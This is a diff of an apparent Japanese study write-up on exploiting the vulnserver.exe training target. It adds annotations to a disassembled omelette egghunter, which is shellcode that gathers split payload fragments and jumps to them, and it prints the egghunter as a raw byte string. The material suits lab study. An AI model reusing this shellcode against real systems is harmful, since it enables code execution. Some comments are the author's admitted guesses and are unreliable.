@@ -2493,55 +2493,57 @@ egg2 = "\x55\xFD\x55\xDA\xBA\xF2\xCA\x66\x7B\xC3\x41\xE9\xFC\xDC\x83\x4E\xF2\x96
 ```
 vulnserver.exeで動作したOmuretu-Hunterは以下。   
 ```txt
-   0:	83 e9 78             	sub    ecx,0x78
-   3:	83 e9 78             	sub    ecx,0x78
-   6:	83 e9 78             	sub    ecx,0x78
+   0:	83 e9 78             	sub    ecx,0x78 ; ECXがEggより高いアドレスだったため、
+   3:	83 e9 78             	sub    ecx,0x78 ; ecx-562することで、Eggより低いアドレスに設定
+   6:	83 e9 78             	sub    ecx,0x78 ; こうすると、Eggの近くから検索が開始されるので早く見つけられる！
    9:	83 e9 78             	sub    ecx,0x78
-   c:	83 e9 52             	sub    ecx,0x52
-   f:	89 cf                	mov    edi,ecx
-  11:	bb fd ff ff ff       	mov    ebx,0xfffffffd
-  16:	eb 29                	jmp    0x41
-  18:	51                   	push   ecx
+   c:	83 e9 52             	sub    ecx,0x52 
+   f:	89 cf                	mov    edi,ecx  ; ediが0x0の場合だと、0x00000000を参照しようとしてAccess-Violationとなった
+                                            ; そのため、ECXを活用して恣意的にEggの近くから探索を始めるようにする
+  11:	bb fd ff ff ff       	mov    ebx,0xfffffffd ; eggをすべて見つけた後でもループが終わらず、権限のないアドレスを参照
+                                                  ; してAccess-Violationとなったため、3回分のEggをカウントするようにする
+  16:	eb 29                	jmp    0x41     ; [1]にジャンプ(SEHがうんたらかんたら？？)
+  18:	51                   	push   ecx      ; [3] <- jmp先
   19:	64 89 20             	mov    DWORD PTR fs:[eax],esp
   1c:	fc                   	cld    
-  1d:	b0 55                	mov    al,0x55
-  1f:	f2 ae                	repnz scas al,BYTE PTR es:[edi]
+  1d:	b0 55                	mov    al,0x55  ; 0x55回、1バイトずつEggの指す分割Shellcodeからスタックに値をコピーする
+  1f:	f2 ae                	repnz scas al,BYTE PTR es:[edi] ; ediが0x1増える？よくわかってない…
   21:	50                   	push   eax
-  22:	89 fe                	mov    esi,edi
-  24:	ad                   	lods   eax,DWORD PTR ds:[esi]
-  25:	35 ff 55 da ba       	xor    eax,0xbada55ff
+  22:	89 fe                	mov    esi,edi ; この時のediのアドレスがちょうどEggを指していればEggを発見できる
+  24:	ad                   	lods   eax,DWORD PTR ds:[esi] ; Eggかもしれない値をEaxに代入
+  25:	35 ff 55 da ba       	xor    eax,0xbada55ff ; eaxの値が0xbada55ffならEgg発見！
   2a:	83 f8 03             	cmp    eax,0x3
-  2d:	77 12                	ja     0x41
-  2f:	59                   	pop    ecx
+  2d:	77 12                	ja     0x41   ; [1]にジャンプ(Eggは発見できない場合)
+  2f:	59                   	pop    ecx ; Eggを発見した場合、以下の処理を実行
   30:	f7 e9                	imul   ecx
   32:	64 03 42 08          	add    eax,DWORD PTR fs:[edx+0x8]
   36:	97                   	xchg   edi,eax
-  37:	f3 a4                	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
-  39:	83 fb ff             	cmp    ebx,0xffffffff
-  3c:	74 2e                	je     0x6c
-  3e:	43                   	inc    ebx
+  37:	f3 a4                	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi] ; 0x55回、1バイトずつスタックの最後にShellcodeの一部を書き込む
+  39:	83 fb ff             	cmp    ebx,0xffffffff  ; ebx=0xfffffffdが2回incされると、合計3個分発見したことになり、Shellcodeにジャンプ
+  3c:	74 2e                	je     0x6c     ; [5]にジャンプ(shellcode用の処理にジャンプ)
+  3e:	43                   	inc    ebx ; 0xfffffffdに0x1を足す。3個分のEggをカウントする
   3f:	89 f7                	mov    edi,esi
-  41:	31 c0                	xor    eax,eax
+  41:	31 c0                	xor    eax,eax    ; [1] <- jmp先
   43:	64 8b 08             	mov    ecx,DWORD PTR fs:[eax]
-  46:	89 cc                	mov    esp,ecx
+  46:	89 cc                	mov    esp,ecx    ; [2] <- jmp先
   48:	59                   	pop    ecx
-  49:	81 f9 ff ff ff ff    	cmp    ecx,0xffffffff
-  4f:	75 f5                	jne    0x46
+  49:	81 f9 ff ff ff ff    	cmp    ecx,0xffffffff ; SEHの最後の例外ハンドラの0xffffffffかどうか確認してる？
+  4f:	75 f5                	jne    0x46      ; [2]にジャンプ
   51:	5a                   	pop    edx
-  52:	e8 c1 ff ff ff       	call   0x18
-  57:	61                   	popa   
+  52:	e8 c1 ff ff ff       	call   0x18   ; [3]にジャンプ(次のアドレスでEggを探す)
+  57:	61                   	popa          ; ここら辺に到達することなくね？？と思ってる。全然わからん…
   58:	8d 66 18             	lea    esp,[esi+0x18]
   5b:	58                   	pop    eax
   5c:	66 0d ff 0f          	or     ax,0xfff
   60:	40                   	inc    eax
-  61:	78 03                	js     0x66
+  61:	78 03                	js     0x66   ; [4]にジャンプ
   63:	97                   	xchg   edi,eax
-  64:	eb db                	jmp    0x41
-  66:	31 c0                	xor    eax,eax
-  68:	64 ff 50 08          	call   DWORD PTR fs:[eax+0x8]
-  6c:	c1 ef 08             	shr    edi,0x8
+  64:	eb db                	jmp    0x41   ; [1]にジャンプ
+  66:	31 c0                	xor    eax,eax ; [4] <- jmp先
+  68:	64 ff 50 08          	call   DWORD PTR fs:[eax+0x8] ; ここらへんはよくわからん
+  6c:	c1 ef 08             	shr    edi,0x8  ; [5] <- jmp先 Ediがshellcodeを指すように調整
   6f:	c1 e7 08             	shl    edi,0x8
-  72:	ff e7                	jmp    edi
+  72:	ff e7                	jmp    edi      ; ediの指すShellcodeにジャンプして実行！
 
 \x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9R\x89\xcf\xbb\xfd\xff\xff\xff\xeb)Qd\x89\xfc\xb0U\xf2\xaeP\x89\xfe\xad5\xffU\xda\xba\x83\xf8\x03w\x12Y\xf7\xe9d\x03B\x08\x97\xf3\xa4\x83\xfb\xfft.C\x89\xf71\xc0d\x8b\x08\x89\xccY\x81\xf9\xff\xff\xff\xffu\xf5Z\xe8\xc1\xff\xff\xffa\x8df\x18Xf\r\xff\x0f@x\x03\x97\xeb\xdb1\xc0d\xffP\x08\xc1\xef\x08\xc1\xe7\x08\xff\xe7
 ```
